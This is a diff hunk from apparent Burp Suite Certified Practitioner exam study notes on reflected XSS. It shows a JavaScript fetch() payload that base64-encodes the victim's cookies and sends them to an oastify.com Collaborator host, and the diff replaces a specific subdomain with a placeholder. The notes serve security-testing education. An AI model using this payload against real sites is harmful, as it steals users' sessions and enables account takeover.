@@ -10,7 +10,7 @@ Burp Suite Certified Practitioner Exam Study Notes
 Search with Reflected XSS deliver Phishing link to victim with cookie stealing payload
 <sub>WAF is preventing dangerous search filters and tags!</sub>
 ```JavaScript
-fetch("https://839cktu7uogedm6a1kjuy3outlzcn2br.oastify.com/?c=" + btoa(document['cookie']))
+fetch("https://Collaborator.oastify.com/?c=" + btoa(document['cookie']))
 ```
 <sup>Base64 encode the payload</sup>
 ```
